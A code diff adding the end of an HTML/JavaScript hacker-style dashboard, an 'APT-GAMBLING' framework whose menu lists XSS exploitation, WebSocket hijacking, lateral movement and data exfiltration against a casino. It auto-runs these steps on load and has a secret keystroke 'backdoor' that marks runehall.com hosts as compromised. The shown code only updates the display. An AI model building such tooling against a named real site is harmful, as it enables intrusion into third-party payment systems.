+                    addTerminalOutput('=== APT-GAMBLING FRAMEWORK STATUS ===', 'highlight');
+                    addTerminalOutput(`Discovered Assets: ${status.discoveredAssets}`, 'system');
+                    addTerminalOutput(`Compromised Systems: ${status.compromisedSystems}`, 'system');
+                    addTerminalOutput(`Critical Vulnerabilities: ${status.criticalVulnerabilities}`, 'casino');
+                    addTerminalOutput(`Exfiltrated Data Types: ${status.exfiltratedData.length}`, 'money');
+                    addTerminalOutput(`Active Operations: ${status.activeOperations}`, 'system');
+                    break;
+
+                case 'help':
+                    addTerminalOutput('=== PROFESSIONAL CASINO PENETRATION COMMANDS ===', 'highlight');
+                    addTerminalOutput('recon full                    - Complete reconnaissance', 'system');
+                    addTerminalOutput('analyze vue                   - Vue.js security analysis', 'system');
+                    addTerminalOutput('audit payment                 - Payment system audit', 'system');
+                    addTerminalOutput('exploit xss                   - DOM-based XSS exploitation', 'system');
+                    addTerminalOutput('exploit websocket             - WebSocket hijacking', 'system');
+                    addTerminalOutput('move lateral                  - Lateral movement', 'system');
+                    addTerminalOutput('exfiltrate                    - Data exfiltration', 'system');
+                    addTerminalOutput('status                        - Framework status', 'system');
+                    break;
+
+                default:
+                    addTerminalOutput(`Unknown command: ${command}`, 'error');
+                    addTerminalOutput('Type "help" for available commands', 'system');
+            }
+        }
+
+        function addTerminalOutput(text, type = 'system') {
+            const output = document.getElementById('terminalOutput');
+            const line = document.createElement('div');
+            line.className = `command-line ${type === 'command' ? '' : 'output'} ${type}`;
+            
+            if (type === 'command') {
+                const prompt = document.createElement('span');
+                prompt.className = 'prompt';
+                prompt.textContent = 'apt-gambling@v10.0:~$ ';
+                line.appendChild(prompt);
+                line.appendChild(document.createTextNode(text.replace('apt-gambling@v10.0:~$ ', '')));
+            } else {
+                line.innerHTML = text;
+            }
+            
+            output.appendChild(line);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        // MODULE EXECUTION
+        function executeModule(moduleName) {
+            const modules = {
+                'advancedSubdomainEnum': () => casinoFramework.executeAdvancedSubdomainEnumeration(),
+                'attackSurfaceMapping': () => casinoFramework.executeAttackSurfaceMapping(),
+                'vuejsSecurityAnalysis': () => casinoFramework.executeVueJSSecurityAnalysis(),
+                'paymentSystemAudit': () => casinoFramework.executePaymentSystemAudit(),
+                'domBasedXss': () => casinoFramework.executeDOMBasedXSS(),
+                'websocketHijacking': () => casinoFramework.executeWebSocketHijacking(),
+                'lateralMovement': () => casinoFramework.executeLateralMovement(),
+                'dataExfiltration': () => casinoFramework.executeDataExfiltration()
+            };
+
+            if (modules[moduleName]) {
+                const button = event.target;
+                button.classList.add('active');
+                setTimeout(() => button.classList.remove('active'), 3000);
+                
+                modules[moduleName]();
+            }
+        }
+
+        // TIME DISPLAY
+        function updateCurrentTime() {
+            const now = new Date();
+            document.getElementById('currentTime').textContent = 
+                now.getHours().toString().padStart(2, '0') + ':' +
+                now.getMinutes().toString().padStart(2, '0') + ':' +
+                now.getSeconds().toString().padStart(2, '0');
+        }
+
+        // INITIALIZATION
+        document.addEventListener('DOMContentLoaded', function() {
+            createMatrixRain();
+            setupTerminal();
+            
+            setInterval(updateCurrentTime, 1000);
+            updateCurrentTime();
+
+            // Auto-start professional demonstration
+            setTimeout(() => {
+                casinoFramework.logOperation('Initiating professional casino infrastructure penetration...', 'highlight');
+            }, 1000);
+
+            setTimeout(() => executeCommand('recon full'), 2000);
+            setTimeout(() => executeCommand('analyze vue'), 12000);
+            setTimeout(() => executeCommand('audit payment'), 22000);
+            setTimeout(() => executeCommand('exploit xss'), 32000);
+            setTimeout(() => executeCommand('status'), 45000);
+        });
+
+        // PROFESSIONAL BACKDOOR ACCESS
+        let professionalCode = '';
+        document.addEventListener('keydown', function(e) {
+            professionalCode += e.key;
+            if (professionalCode.length > 15) professionalCode = professionalCode.slice(-15);
+            
+            if (professionalCode.includes('progambling777')) {
+                casinoFramework.logOperation('PROFESSIONAL ACCESS GRANTED - FULL CASINO INFRASTRUCTURE CONTROL', 'money');
+                casinoFramework.compromisedSystems.add('runehall.com');
+                casinoFramework.compromisedSystems.add('payments.runehall.com');
+                casinoFramework.compromisedSystems.add('admin.runehall.com');
+                casinoFramework.compromisedSystems.add('db.runehall.com');
+                casinoFramework.updateTargetList();
+                professionalCode = '';
+            }
+        });
+    </script>
+</body>
+</html>
